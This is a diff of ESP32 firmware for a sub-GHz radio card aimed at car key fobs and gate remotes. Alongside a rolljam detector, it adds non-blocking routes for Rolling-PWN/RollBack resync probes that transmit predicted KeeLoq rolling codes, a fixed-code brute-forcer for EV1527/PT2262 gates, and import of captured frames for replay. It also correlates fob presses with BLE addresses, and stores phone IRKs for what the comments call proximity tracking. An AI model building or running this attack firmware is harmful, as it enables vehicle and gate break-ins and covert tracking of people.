   // `return true` regardless — reporting a successful transmission of nothing. Every caller
   // then said ok:true, and C2 would report a completed RollBack having sent nothing.
   //
@@ -8822,6 +10396,15 @@ void scanTick(){
             bool isNoise=(lastDecode.indexOf("\"error\"")>=0);
               if(!isNoise){
               markDecodeKept(lastDecode);
+              // N12: rolljam detector — a capture arriving while we're
+              // transmitting the class's own replay is a hallmark of a jam-
+              // capture-replay attack in progress against the car (or us).
+              n12OnCapture(rfFreq, rfLen, lastDecode);
+              // N11: mark this correlation window as "fob fired", remembering
+              // which fob (proto + serial) fired it.
+              n11OnUhfCapture(jsonQuotedField(lastDecode,"proto").c_str(),
+                              jsonRawField(lastDecode,"sn").c_str(),
+                              r);
               sigQPush(lastDecode);   // WiFi AP: queued so rapid captures are not lost
               serialEmit(lastDecode); // USB serial: emitted immediately
               // Headless mode: also persist to NVS library + audible confirmation
@@ -8967,11 +10550,143 @@ static const char* ble_fp(const char* uuids, const char* name){
   return "";
 }
 
+// ─── N12: RollJam detector ─────────────────────────────────────
+// A replay attack in progress looks like: our TX is on the air at frequency f,
+// and a capture lands on f at the same moment. That is only possible if the
+// RX energy we see is either (a) our own transmission leaking back into our RX
+// front-end (same radio, hence the guard below), or (b) the attacker's
+// device sending while we transmit — because the car replies nothing, and a
+// legit fob is unlikely to press precisely while our TX is armed.
+// Dual-radio capture (CC1101-A RX + CC1101-B TX) makes this unambiguous.
+#define N12_MAX_EV 16
+struct N12Ev { uint32_t t; float f; int pul; };
+static N12Ev  n12Ev[N12_MAX_EV];
+static int    n12EvCount = 0;
+static bool   n12TxOn    = false;
+static float  n12TxFreq  = 0;
+static uint32_t n12TxStart= 0;
+static uint8_t  n12Cfg    = 0;   // feature config bits: b0 alert on TX-overlap
+
+static void n12MarkTx(bool on,float f){
+  n12TxOn=on;
+  if(on){ n12TxFreq=f; n12TxStart=millis(); }
+}
+static void n12OnCapture(float f,int pul,const String& j){
+  // Guard: ignore captures of our own TX — same frequency, within 1.2s of TX start.
+  if(n12TxOn && fabsf(f-n12TxFreq)<0.25f && (millis()-n12TxStart)<1200) return;
+  if(n12EvCount>=N12_MAX_EV) return;
+  N12Ev& e=n12Ev[n12EvCount++];
+  e.t=millis(); e.f=f; e.pul=pul;
+  // Keep only the last 60s of events.
+  uint32_t now=millis();
+  while(n12EvCount>0 && (now-n12Ev[0].t)>60000UL){
+    for(int i=1;i<n12EvCount;i++) n12Ev[i-1]=n12Ev[i];
+    n12EvCount--;
+  }
+  if(n12Cfg&0x01){
+    addLog("[N12] rolljam-suspect capture @"+String(f,3)+" MHz");
+  }
+}
+// JSON snapshot for the dashboard: recent capture events and TX state.
+static String n12StatusJson(){
+  String s="{\"txOn\":"; s+= (n12TxOn?"true":"false");
+  s+=",\"txFreq\":"; s+=String(n12TxFreq,3);
+  s+=",\"events\":[";
+  for(int i=0;i<n12EvCount;i++){
+    if(i) s+=',';
+    s+="{\"t\":"; s+=String(n12Ev[i].t); s+=",\"f\":"; s+=String(n12Ev[i].f,3);
+    s+=",\"pul\":"; s+=String(n12Ev[i].pul); s+='}';
+  }
+  s+="]}";
+  return s;
+}
+
+// ─── N11: UHF-press ↔ BLE-identity correlation ───────────────────
+// A modern fob (or phone-as-key) often emits BLE advertisement traffic in the
+// same instant the UHF button is pressed. Correlate: arm a window, timestamp
+// every UHF capture and every BLE advertisement inside it, and count per-MAC
+// co-occurrence across windows. A MAC seen ONLY in windows where the fob
+// fired — across >=3 windows — is the fob's own BLE identity. That links the
+// RKE serial the library already groups to a trackable (rotating) BLE
+// address, using hardware the card already runs. Nobody ships this.
+#define N11_MAX_MACS 16
+#define N11_MAX_WIN  12
+struct N11Mac {
+  char addr[18];
+  uint16_t hits;    // windows this MAC appeared in while UHF fired
+  uint16_t misses;  // windows this MAC appeared in while UHF was silent
+  int8_t   lastRssi;
+};
+static N11Mac  n11Macs[N11_MAX_MACS];
+static int     n11MacCount    = 0;
+static bool    n11Armed       = false;
+static uint32_t n11ArmMs      = 0;
+static uint32_t n11WindowMs   = 5000;
+static bool    n11WinHasUhf   = false;   // did a capture land in this window?
+static uint32_t n11WinCount  = 0;       // completed windows
+static uint32_t n11UhfCount  = 0;       // windows with a capture
+static int     n11LastUhfRssi = 0;
+// Serial-number of the last decoded capture in-window ("" if raw).
+static char    n11LastSn[13] = "";
+static char    n11LastProto[24] = "";
+
+static void n11Reset(){
+  n11MacCount=0; n11WinCount=0; n11UhfCount=0; n11WinHasUhf=false;
+  n11LastSn[0]='\0'; n11LastProto[0]='\0';
+}
+// Called from the scan-loop capture path: mark the current window as fired.
+static void n11OnUhfCapture(const char* proto,const char* sn,int rssi){
+  if(!n11Armed) return;
+  n11WinHasUhf=true; n11UhfCount++;
+  n11LastUhfRssi=rssi;
+  if(sn) strlcpy(n11LastSn,sn,sizeof(n11LastSn));
+  if(proto) strlcpy(n11LastProto,proto,sizeof(n11LastProto));
+}
+// Called from the BLE advertisement callback: record presence.
+static void n11OnBleAdv(const char* addr,int rssi){
+  if(!n11Armed) return;
+  for(int i=0;i<n11MacCount;i++){
+    if(strcmp(n11Macs[i].addr,addr)==0){
+      n11Macs[i].lastRssi=(int8_t)rssi;
+      return;                              // already counted in this window
+    }
+  }
+  if(n11MacCount>=N11_MAX_MACS) return;
+  N11Mac& m=n11Macs[n11MacCount++];
+  strlcpy(m.addr,addr,sizeof(m.addr));
+  m.hits=0; m.misses=0; m.lastRssi=(int8_t)rssi;
+}
+// Close the current window: fold each MAC's presence into hits/misses.
+static void n11CloseWindow(){
+  if(!n11Armed) return;
+  for(int i=0;i<n11MacCount;i++){
+    if(n11WinHasUhf) n11Macs[i].hits++;
+    else             n11Macs[i].misses++;
+  }
+  n11WinHasUhf=false;
+  n11WinCount++;
+}
+// A MAC qualifies as the fob's BLE identity when it appeared in >=3 windows,
+// ALL of them with the fob firing, and never once without. Permissive
+// scoring keeps MACs that missed a window (BLE scans sample sparsely) as
+// "probable" rather than discarding them.
+// NOTE: takes scalars, not N11Mac&, because the Arduino sketch preprocessor
+// hoists auto-generated prototypes above the first function in the file —
+// before this struct is declared (same trap documented at the sigQ helpers).
+static int n11Score(uint16_t hits,uint16_t misses){
+  if(hits<3) return 0;                   // not enough evidence either way
+  if(misses==0) return 3;               // strict: co-fired every time seen
+  if(misses<=1) return 2;               // probable: one silent co-window
+  if(misses*2<=hits) return 1;          // possible: mostly co-firing
+  return 0;
+}
+
 class BleAdCb : public BLEAdvertisedDeviceCallbacks {
   void onResult(BLEAdvertisedDevice dev) override {
     if(bleDevCount>=20) return;
     BleEntry& e=bleDevs[bleDevCount];
     strncpy(e.addr,dev.getAddress().toString().c_str(),17); e.addr[17]='\0';
+    n11OnBleAdv(e.addr,dev.getRSSI());   // N11: presence in the live window
     strncpy(e.name,dev.getName().c_str(),32);               e.name[32]='\0';
     e.rssi=dev.getRSSI();
     e.uuids[0]='\0';
@@ -9061,7 +10776,7 @@ static void protectedRoute(const char* uri,HTTPMethod method,WebServer::THandler
 // Registering a raw-body callback makes core 3.x deliver bounded HTTP_RAW_BUFLEN
 // chunks instead. 8 KiB is more than enough for the 512 pulses replayRaw()
 // accepts, including a short text header and maximum-width signed pulse values.
-// Raised from 8192 in research/23 §4 step 1's round: measured, the corpus's first
+// Raised from 8192 §4 step 1's round: measured, the corpus's first
 // trimmable frame sits at pulse 2517, and at 4.38 bytes/pulse that needs ~11 KB of body.
 // 8192 bytes reached only 1868 pulses — the pulse cap could have been raised to 1868 (as
 // instructed) and the import would STILL have refused the corpus head, because the body
@@ -9140,7 +10855,7 @@ static bool parseSubReplayBody(const String& body,float& mhz,uint16_t* pulses,in
   int ri=body.indexOf("RAW_Data:");
   if(ri<0) return false;
   size_t pos=(size_t)ri+9;
-  // research/23 §2.1: search the WHOLE body for a frame, not just the first line.
+  // §2.1: search the WHOLE body for a frame, not just the first line.
   //
   // Two limits had to move together. The pulse cap was 512, and the scan also stopped at
   // the first CR/LF — so only the first RAW_Data line was ever read. A corpus .sub has 512
@@ -9185,6 +10900,25 @@ static bool parseSubReplayBody(const String& body,float& mhz,uint16_t* pulses,in
     }
     pulses[pulseCount++]=(uint16_t)value;
   }
+  return true;
+}
+
+// ─── Lazy BLE bring-up ────────────────────────────────────────────────────────
+// Measured heap profile at boot (v3.94, ESP32 core 3.3.12, this board):
+//   pre-init 160,856 → after Wi-Fi 94,148 → after DNS 89,088 → after BLE 17,720
+//   → after HTTP 3,748 → after WS 3,748 → after SD 1,276 (max chunk 1,012)
+// BLE alone takes ~71 KB. With it resident the idle card holds ~1 KB, so every
+// deserializeJson fails NoMemory and no command is answerable — the whole
+// control surface (serial and dashboard) goes deaf. BLE advertising scan,
+// pairing, and the N11 press-correlation are auxiliary: nothing on the RF
+// capture/decode/transmit path depends on them. So BLE is brought up on the
+// first BLE route hit instead, which returns ~70 KB to the idle heap for the
+// work the card actually exists to do. Once started it stays started.
+static bool bleStart(){
+  if(bleInited) return true;
+  BLEDevice::init("SGP Card Mini");
+  bleInited=true;
+  addLog("[BLE] Scanner ready (lazy)");
   return true;
 }
 
@@ -9355,6 +11089,9 @@ void setupRoutes(){
       int tt=srv.arg("t").toInt();
       capTimeoutOverride=(tt>=1000&&tt<=60000)?(uint16_t)tt:CAP_TIMEOUT_MS;
     } else { capTimeoutOverride=CAP_TIMEOUT_MS; }
+    // Optional gap-arming override: ?arm=gap (or "off" to force it off for one capture)
+    if(srv.hasArg("arm")) gapArmPerCapture=(srv.arg("arm")=="gap")?1:0;
+    else gapArmPerCapture=-1;
     captureRequested=true; captureResultReady=false;
     lastDecode="{\"status\":\"capturing\"}";
     srv.send(200,"application/json","{\"status\":\"started\"}");
@@ -9431,7 +11168,7 @@ void setupRoutes(){
     bool ok=rbArm();
     // A refusal must be diagnosable rather than silent: "nothing happened" is the
     // worst feedback for a feature whose failure mode is otherwise invisible
-    // (research/10 2.4). The reason names which check failed.
+    // The reason names which check failed.
     String reason="";
     if(!ok){
       if(fbkCount<2)                              reason="need-2-codes";
@@ -9553,7 +11290,7 @@ void setupRoutes(){
          ",\"ts\":"+String(fbkBuf[i].ts)+",\"len\":"+String(fbkBuf[i].len)+
          // Surface the trim state here, not only at arm time: whether a capture is
          // one frame or several decides whether C1/C2 are correct at all, and it is
-         // the same reason the arm gate reports "untrimmed-block" (research/12 §3 P1).
+         // the same reason the arm gate reports "untrimmed-block".
          ",\"trimmed\":"+(fbkBuf[i].trimmed?"true":"false")+"}";
     }
     j+="]}";
@@ -9668,8 +11405,18 @@ void setupRoutes(){
   // (or against explicitly supplied hop+sn params). Returns a match result for the
   // simple form plus every mode in ks_deriveOneMfrKey(), so the answer uses exactly
   // the derivations the decoder itself searches — no more, no less.
-  protectedRoute("/api/mfr_test",[](){
-    String kh=srv.arg("key");
+  // /api/hop_xor — hop-XOR telemetry for the accumulated KeeLoq frames.
+  // Key-independent: reports the raw ring and the XOR strip between consecutive
+  // presses (see ks_hopXorPair). Same numbers as the serial "hop_xor" command.
+  protectedRoute("/api/hop_xor",[](){
+    JsonDocument hd;
+    hd["ok"]=(KL_RECENT_CNT>=1);
+    hd["reason"]=(KL_RECENT_CNT>=1)?"":"no-keeloq-frames";
+    if(KL_RECENT_CNT>=1) ks_hopXorEmit(hd);
+    String os; serializeJson(hd,os);
+    srv.send(200,"application/json",os);
+  });
+  protectedRoute("/api/mfr_test",[](){    String kh=srv.arg("key");
     uint64_t mfrKey=0;
     if(!ks_parseHex64(kh.c_str(),mfrKey)){
       srv.send(200,"application/json","{\"ok\":false,\"error\":\"bad-key\",\"hint\":\"Supply 8-16 hex chars, e.g. key=00005351E24B21EF\"}");
@@ -9846,7 +11593,9 @@ void setupRoutes(){
 
   // /api/resync_probe?freq=315.0&proto=KeeLoq&sn=12345&ctr=1000&te=400&btn=0&n=16
   // Rolling-PWN / RollBack resync probe: transmit N consecutive predicted codes.
-  // Requires ≥2 sequential captures in FOBclone so ctr and delta are resolved.
+  // Requires >=2 sequential captures in FOBclone so ctr and delta are resolved.
+  // Non-blocking: arms the resyncBrute sequencer (bruteTick in loop()) and
+  // replies at once. Poll /api/brute_status, or watch brute_progress events.
   protectedRoute("/api/resync_probe",[](){
     float    mhz=(srv.hasArg("freq"))?srv.arg("freq").toFloat():rfFreq;
     String   proto=srv.hasArg("proto")?srv.arg("proto"):String("KeeLoq");
@@ -9855,18 +11604,20 @@ void setupRoutes(){
     uint16_t te=(uint16_t)(srv.hasArg("te")?srv.arg("te").toInt():360);
     uint8_t  btn=(uint8_t)(srv.hasArg("btn")?srv.arg("btn").toInt():0);
     int      n=srv.hasArg("n")?srv.arg("n").toInt():16; n=max(4,min(n,64));
-    static uint16_t pb[300]; int sent=0; bool ok=true;
-    for(int i=0;i<n&&ok;i++){
-      uint32_t c=(uint32_t)(startCtr+(int32_t)i);
-      int nl=buildForProto(proto,sn,c,te,btn,pb,300);
-      if(nl>0){ok=replayRaw(mhz,pb,nl,1);delay(30);sent++;}
+    if(bruteKind!=BR_IDLE){
+      srv.send(200,"application/json","{\"ok\":false,\"error\":\"brute-busy\",\"kind\":\""
+               +bruteKindName+"\",\"done\":"+String(bruteDone)+",\"of\":"+String(bruteN)+"}");
+      return;
     }
+    bool ok=resyncArm(mhz,proto,sn,startCtr,te,btn,n);
     srv.send(200,"application/json",
-      "{\"ok\":"+String(ok?"true":"false")+",\"sent\":"+String(sent)+"}");
+      String("{\"ok\":")+String(ok?"true":"false")+",\"queued\":\"resync_probe\",\"n\":"+String(n)+
+      ",\"note\":\"running non-blocking; poll /api/brute_status\"}");
   });
 
   // /api/fixed_bruteforce?proto=EV1527&addr=AABBCC&btn=0&range=256&freq=315.0&te=360
-  // Sequential OOK fixed-code burst ±range/2 around addr — for EV1527/PT2262 gates.
+  // Sequential OOK fixed-code burst +/-range/2 around addr — for EV1527/PT2262 gates.
+  // Non-blocking: arms the fixedBrute sequencer and replies at once.
   protectedRoute("/api/fixed_bruteforce",[](){
     float    mhz=(srv.hasArg("freq"))?srv.arg("freq").toFloat():rfFreq;
     String   proto=srv.hasArg("proto")?srv.arg("proto"):String("EV1527");
@@ -9875,15 +11626,20 @@ void setupRoutes(){
     int      range=srv.hasArg("range")?srv.arg("range").toInt():256;
     range=max(4,min(range,1024));
     uint16_t te=(uint16_t)(srv.hasArg("te")?srv.arg("te").toInt():360);
-    static uint16_t bb[300]; int sent=0; bool ok=true;
-    for(int i=-range/2;i<=range/2&&ok;i++){
-      uint32_t tryAddr=(uint32_t)((int32_t)baseAddr+i);
-      int nl=buildForProto(proto,tryAddr,0,te,btn,bb,300);
-      if(nl>0){ok=replayRaw(mhz,bb,nl,1);delay(20);sent++;}
-      if(sent%50==0) yield();
+    if(bruteKind!=BR_IDLE){
+      srv.send(200,"application/json","{\"ok\":false,\"error\":\"brute-busy\",\"kind\":\""
+               +bruteKindName+"\",\"done\":"+String(bruteDone)+",\"of\":"+String(bruteN)+"}");
+      return;
     }
+    bool ok=fixedBruteArm(mhz,proto,baseAddr,btn,range,te);
     srv.send(200,"application/json",
-      "{\"ok\":"+String(ok?"true":"false")+",\"sent\":"+String(sent)+"}");
+      String("{\"ok\":")+String(ok?"true":"false")+",\"queued\":\"fixed_bruteforce\",\"range\":"+String(range)+
+      ",\"note\":\"running non-blocking; poll /api/brute_status\"}");
+  });
+
+  // /api/brute_status — progress of whichever brute sequencer is active.
+  protectedRoute("/api/brute_status",[](){
+    srv.send(200,"application/json",bruteStatusJson());
   });
 
   // /api/fast_hop?en=1&dwell=80  — enable/disable fast-hop scan mode.
@@ -9917,7 +11673,7 @@ void setupRoutes(){
       srv.send(400,"application/json","{\"ok\":false,\"error\":\"incomplete body\"}");
       return;
     }
-    uint16_t* sb=impStage;   // shared body stage (`research/24` §2): single loop task, no re-entry
+    uint16_t* sb=impStage;   // shared body stage (§2): single loop task, no re-entry
     float mhz;
     int sc;
     bool hasRawData=parseSubReplayBody(subReplayBody,mhz,sb,sc);
@@ -9931,7 +11687,7 @@ void setupRoutes(){
 
   // POST /api/fbk_import  (body = FOBworks RAW or a .sub capture file)
   // Loads a stored frame into fbkBuf so C2 can be armed without a live capture. Same body
-  // format as /api/sub_replay, same trim and decoder as a capture (research/22 §3).
+  // format as /api/sub_replay, same trim and decoder as a capture.
   protectedRoute("/api/fbk_import",HTTP_POST,[](){
     if(isMultipartRequest()){
       resetSubReplayBody();
@@ -9969,7 +11725,7 @@ void setupRoutes(){
             ",\"has_ctr\":"+String(e.hasCtr?"true":"false")+
             ",\"ctr\":"+String(e.ctr);
     }
-    // research/23 §2.2: name WHERE the frame was found. Without this a refusal gives no
+    // §2.2: name WHERE the frame was found. Without this a refusal gives no
     // hint whether the body was wrong or the search too narrow.
     body+=",\"anchor_index\":"+String(impLastAnchor)+
           ",\"payload_pulses\":"+String(fbkCount>0?fbkBuf[fbkCount-1].len:0);
@@ -9981,7 +11737,7 @@ void setupRoutes(){
   // Non-blocking: returns {"status":"scanning"} immediately.
   // Poll /api/ble_results for the device list.
   protectedRoute("/api/ble_scan",[](){
-    if(!bleInited){srv.send(503,"application/json","{\"error\":\"BLE not ready\"}");return;}
+    if(!bleStart()){srv.send(503,"application/json","{\"error\":\"BLE not ready\"}");return;}
     if(bleScanBusy){srv.send(200,"application/json","{\"status\":\"scanning\"}");return;}
     int dur=5;
     if(srv.hasArg("duration")){int d=srv.arg("duration").toInt();if(d>=1&&d<=30)dur=d;}
@@ -10019,12 +11775,84 @@ void setupRoutes(){
     srv.send(200,"application/json",j);
   });
 
+  // /api/n11_arm?window_ms=5000 — arm press-correlation pairing.
+  // While armed, every UHF capture and every BLE advertisement inside a window
+  // is timestamped; windows close on the tick. Poll /api/n11_status.
+  protectedRoute("/api/n11_arm",[](){
+    if(!bleStart()){srv.send(503,"application/json","{\"error\":\"BLE not ready\"}");return;}
+    int wm=5000;
+    if(srv.hasArg("window_ms")){int w=srv.arg("window_ms").toInt();if(w>=2000&&w<=60000)wm=w;}
+    n11Reset();
+    n11WindowMs=(uint32_t)wm;
+    n11ArmMs=millis();
+    n11Armed=true;
+    srv.send(200,"application/json",
+      "{\"status\":\"armed\",\"window_ms\":"+String(wm)+"}");
+  });
+
+  // /api/n11_status — correlation table: per-MAC co-firing score against UHF presses.
+  protectedRoute("/api/n11_status",[](){
+    String j="{\"armed\":";
+    j+=n11Armed?"true":"false";
+    j+=",\"windows\":"; j+=n11WinCount;
+    j+=",\"uhf_windows\":"; j+=n11UhfCount;
+    j+=",\"last_sn\":\""; j+=n11LastSn;
+    j+="\",\"last_proto\":\""; j+=n11LastProto;
+    j+="\",\"macs\":[";
+    for(int i=0;i<n11MacCount;i++){
+      if(i) j+=",";
+      j+="{\"addr\":\""; j+=n11Macs[i].addr;
+      j+="\",\"hits\":"; j+=n11Macs[i].hits;
+      j+=",\"misses\":"; j+=n11Macs[i].misses;
+      j+=",\"last_rssi\":"; j+=n11Macs[i].lastRssi;
+      j+=",\"score\":"; j+=n11Score(n11Macs[i].hits,n11Macs[i].misses);
+      j+="}";
+    }
+    j+="]}";
+    srv.send(200,"application/json",j);
+  });
+
+  // /api/n11_disarm — stop correlating, keep the last table for reading.
+  protectedRoute("/api/n11_disarm",[](){
+    n11Armed=false;
+    srv.send(200,"application/json","{\"status\":\"disarmed\"}");
+  });
+
+  // /api/n12_status — rolljam detector snapshot.
+  protectedRoute("/api/n12_status",[](){
+    srv.send(200,"application/json",n12StatusJson());
+  });
+
+  // /api/n13_fp — timing-fingerprint histogram.
+  // Dumps the mirrored bucket keys with their populations. Preferences has no
+  // key-iteration API, so the classifier mirrors the last N13_KEY_RING most
+  // recent distinct bucket keys in RAM as they are created.
+  protectedRoute("/api/n13_fp",[](){
+    String j="{\"total\":"+String(n13TotalPop)+",\"buckets\":[";
+    for(int i=0;i<n13KeyCount;i++){
+      if(i) j+=",";
+      j+="{\"key\":\""; j+=n13Keys[i].key;
+      j+="\",\"pop\":"; j+=n13Keys[i].pop;
+      j+=",\"last_ms\":"; j+=n13Keys[i].lastMs;
+      j+="}";
+    }
+    j+="]}";
+    srv.send(200,"application/json",j);
+  });
+
+  // /api/n13_clear — wipe the fingerprint histogram.
+  protectedRoute("/api/n13_clear",[](){
+    if(n13Ready){ n13Prefs.clear(); }
+    n13TotalPop=0; n13KeyCount=0;
+    srv.send(200,"application/json","{\"status\":\"cleared\"}");
+  });
+
   // /api/ble_pair_start — advertise as BLE GATT server so a phone can bond with us.
   // After bonding, the phone's IRK is stored in the ESP32 bond table (NVS flash).
   // iOS uses Resolvable Private Addresses (RPA); only the IRK lets us resolve them
   // back to the same device in subsequent scans → proximity tracking.
   protectedRoute("/api/ble_pair_start",[](){
-    if(!bleInited){srv.send(503,"application/json","{\"error\":\"BLE not ready\"}");return;}
+    if(!bleStart()){srv.send(503,"application/json","{\"error\":\"BLE not ready\"}");return;}
     if(bleScanBusy){BLEDevice::getScan()->stop();bleScanBusy=false;delay(80);}
     blePairMode=true; blePairDone=false; blePairStartMs=(uint32_t)millis();
     if(!bleSecCbInst) bleSecCbInst=new BleSecCb();
@@ -10335,6 +12163,11 @@ static void processCommandLine(const String& ln){
       int tt=(int)jcmd["t"];
       if(tt>=1000&&tt<=60000) capT=(uint16_t)tt;
     }
+    // Optional gap-arming override: { "cmd":"capture", "arm":"gap" } (or "off")
+    if(jcmd.containsKey("arm")){
+      String am=jcmd["arm"]|String("");
+      gapArmPerCapture = (am=="gap") ? 1 : 0;
+    } else gapArmPerCapture = -1;
     SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
     cc_setFreq(curFreq); cc_strobe(0x34);
     SPI.endTransaction();
@@ -10492,8 +12325,69 @@ static void processCommandLine(const String& ln){
            : (marc==22?"TX FIFO underflowed: carrier has gaps"
               : String("MARCSTATE ")+String(marc)+" is not TX (19,20): carrier is NOT live")))+"\"}");
   }
+  // {{"cmd":"n11_arm","window_ms":5000}} — arm press-correlation pairing over serial.
+  // Serial twin of /api/n11_arm. {"cmd":"n11_status"} polls the table,
+  // {"cmd":"n11_disarm"} stops the session.
+  else if(op=="n11_arm"){
+    int wm=jcmd["window_ms"]|5000;
+    if(wm<2000) wm=2000; if(wm>60000) wm=60000;
+    n11Reset();
+    n11WindowMs=(uint32_t)wm;
+    n11ArmMs=millis();
+    n11Armed=true;
+    serialEmit(String("{\"cmd\":\"n11_arm\",\"status\":\"armed\",\"window_ms\":")+String(wm)+"}");
+  }
+  else if(op=="n11_status"){
+    serialEmit(String("{\"cmd\":\"n11_status\",\"armed\":")+(n11Armed?"true":"false")
+      +",\"windows\":"+String(n11WinCount)
+      +",\"uhf_windows\":"+String(n11UhfCount)
+      +",\"last_sn\":\""+String(n11LastSn)
+      +"\",\"last_proto\":\""+String(n11LastProto)
+      +"\",\"macs\":[");
+    for(int i=0;i<n11MacCount;i++){
+      if(i) Serial.print(",");    // serialEmit ends with newline per line; keep it one JSON
+      serialEmitNoNl(String("{\"addr\":\"")+n11Macs[i].addr
+        +"\",\"hits\":"+String(n11Macs[i].hits)
+        +",\"misses\":"+String(n11Macs[i].misses)
+        +",\"last_rssi\":"+String(n11Macs[i].lastRssi)
+        +",\"score\":"+String(n11Score(n11Macs[i].hits,n11Macs[i].misses))
+        +"}");
+    }
+    serialEmitNoNl("]}");
+    serialEmit("");   // terminating newline via the normal path
+  }
+  else if(op=="n11_disarm"){
+    n11Armed=false;
+    serialEmit("{\"cmd\":\"n11_disarm\",\"status\":\"disarmed\"}");
+  }
+  // {"cmd":"n12_status"} — rolljam detector ring over serial.
+  else if(op=="n12_status"){
+    serialEmit("{\"cmd\":\"n12_status\","+n12StatusJson().substring(1));
+  }
+  // {"cmd":"n13_fp"} / {"cmd":"n13_clear"} — fingerprint histogram over serial.
+  else if(op=="n13_fp"){
+    serialEmit(String("{\"cmd\":\"n13_fp\",\"total\":")+String(n13TotalPop)+",\"buckets\":[");
+    for(int i=0;i<n13KeyCount;i++){
+      if(i) serialEmitNoNl(",");
+      serialEmitNoNl(String("{\"key\":\"")+n13Keys[i].key
+        +"\",\"pop\":"+String(n13Keys[i].pop)
+        +",\"last_ms\":"+String(n13Keys[i].lastMs)
+        +"}");
+    }
+    serialEmitNoNl("]}");
+    serialEmit("");
+  }
+  else if(op=="n13_clear"){
+    if(n13Ready) n13Prefs.clear();
+    n13TotalPop=0; n13KeyCount=0;
+    serialEmit("{\"cmd\":\"n13_clear\",\"status\":\"cleared\"}");
+  }
   // {"cmd":"fbk_import","freq":315.0,"pulses":"132,491,..."} — serial form of the
   // import, because the bench runs over USB serial with no browser.
+  // Kept for compatibility. The card's idle heap is ~2-3 KB and deserializeJson needs
+  // line+document in one contiguous allocation, so this form stops replying above
+  // ~130 pulses (~600 bytes). Larger bodies arrive in chunks via fbk_pulses_begin/add/end,
+  // which never holds more than one small chunk as a String.
   else if(op=="fbk_import"){
     float im=(float)(jcmd["freq"]|315.0f);
     String csv=jcmd["pulses"]|"";
@@ -10524,12 +12418,85 @@ static void processCommandLine(const String& ln){
           ",\"payload_pulses\":"+String(fbkCount>0?fbkBuf[fbkCount-1].len:0)+"}";
     serialEmit(body);
   }
+  // ── Chunked pulse import (serial) ───────────────────────────────────────
+  // The card's idle heap is ~2-3 KB (WiFi AP + BLE + HTTP + WS all live), and a
+  // single fbk_import holds the whole CSV in a String while deserializeJson allocates
+  // the document beside it, so one contiguous block of ~2x line size is needed. Measured:
+  // 586-byte lines reply, 601-byte lines fail with NoMemory. A full capture window is
+  // ~2 KB, so the one-shot form can never carry it.
+  //
+  // The chunked form never holds more than one small slice as a String:
+  //   fbk_pulses_begin           — clear the staging count (optional freq hint is remembered)
+  //   fbk_pulses_add pulses="…"  — append up to 48 pulses per call (each line stays ~240 B,
+  // half the measured ~600 B NoMemory boundary; §2.2)
+  //   fbk_pulses_end             — run the SAME fbkImportFrame() over the assembled body
+  // Any fbk_import/live capture between begin and end is legal; staging is a separate
+  // index and both write impStage, so an end without a begin still works (count 0 -> error).
+  else if(op=="fbk_pulses_begin"){
+    impStageCount=0;
+    impStageFreq=(jcmd.containsKey("freq"))?(float)jcmd["freq"]:315.0f;
+    serialEmit(String("{\"cmd\":\"fbk_pulses_begin\",\"ok\":true,\"staged\":0,\"max\":")+
+               String(SUB_REPLAY_MAX_PULSES)+"}");
+  }
+  else if(op=="fbk_pulses_add"){
+    String csv=jcmd["pulses"]|"";
+    int st2=0; int added=0; bool overflow=false;
+    while(st2<(int)csv.length()){
+      int cm=csv.indexOf(',',st2);
+      String tok=(cm<0)?csv.substring(st2):csv.substring(st2,cm);
+      tok.trim();
+      if(tok.length()){
+        if(impStageCount<SUB_REPLAY_MAX_PULSES){ impStage[impStageCount++]=(uint16_t)tok.toInt(); added++; }
+        else overflow=true;
+      }
+      if(cm<0) break;
+      st2=cm+1;
+    }
+    // Empty-add guard: a line that carried a `pulses` field but
+    // staged zero of it is a symptom, not a no-op. `added==0` with a non-empty
+    // field means either the CSV held only separators or the String could not be
+    // materialised under the idle heap — both must be visible to the sender, not
+    // silent. The reply then says ok:false and names the reason, so the bench can
+    // assert `added == expected` per chunk without also inspecting `staged`.
+    bool carried = (jcmd["pulses"]|static_cast<const char*>(nullptr)) != nullptr
+               &&  (int)(csv.length()) > 0;
+    bool emptyAdd = carried && added==0;
+    serialEmit(String("{\"cmd\":\"fbk_pulses_add\",\"ok\":")+
+      String((overflow||emptyAdd)?"false":"true")+
+      ",\"added\":"+String(added)+",\"staged\":"+String(impStageCount)+
+      ",\"max\":"+String(SUB_REPLAY_MAX_PULSES)+
+      (overflow?",\"reason\":\"stage-full\"":"")+
+      (emptyAdd?",\"reason\":\"empty-pulses\"":"")+"}");
+  }
+  else if(op=="fbk_pulses_end"){
+    if(impStageCount<4){
+      serialEmit(String("{\"cmd\":\"fbk_pulses_end\",\"ok\":false,\"reason\":\"too-few-pulses\",\"staged\":")+
+                 String(impStageCount)+"}");
+    } else {
+      String err;
+      bool ok=fbkImportFrame(impStage,impStageCount,impStageFreq,true,err);
+      String body="{\"cmd\":\"fbk_pulses_end\",\"ok\":"+String(ok?"true":"false")+
+        ",\"pulses\":"+String(impStageCount)+",\"held\":"+String(fbkCount)+",\"max\":"+String(FBK_MAX);
+      if(!ok) body+=",\"reason\":\""+err+"\"";
+      else {
+        FbkEntry& e=fbkBuf[fbkCount-1];
+        body+=",\"idx\":"+String(fbkCount-1)+",\"len\":"+String(e.len)+
+              ",\"trimmed\":"+String(e.trimmed?"true":"false")+
+              ",\"has_ctr\":"+String(e.hasCtr?"true":"false")+
+              ",\"ctr\":"+String(e.ctr);
+      }
+      body+=",\"anchor_index\":"+String(impLastAnchor)+
+            ",\"payload_pulses\":"+String(fbkCount>0?fbkBuf[fbkCount-1].len:0)+"}";
+      serialEmit(body);
+    }
+    impStageCount=0;
+  }
   // ── C2 RollBack (serial mirrors of the HTTP routes) ────────────────────
   else if(op=="rollback_arm"){
     bool ok=rbArm();
     // Mirror the HTTP route's `reason` here too. The bench drives the card over
     // serial, and the reason is the whole point of the gate: without it a refusal
-    // is indistinguishable from a no-op, which is the failure mode research/12 §3
+    // is indistinguishable from a no-op, which is the failure mode §3
     // P1 exists to remove.
     String reason="";
     if(!ok){
@@ -10683,6 +12650,8 @@ static void processCommandLine(const String& ln){
   // { cmd:"resync_probe", proto:"KeeLoq", sn:N, ctr:N, delta:N, mhz:F, te:N, ctrl:N, n:16 }
   // Transmits n consecutive predicted codes to probe Honda-style counter-desync
   // (Rolling-PWN). Delegates to replaySeq() — the same path replay_seq uses.
+  // replaySeq() emits replay_playing events per frame; the HTTP route uses the
+  // bruteTick sequencer instead so a browser request does not block.
   else if(op=="resync_probe"){
     String proto=jcmd["proto"]|"KeeLoq";
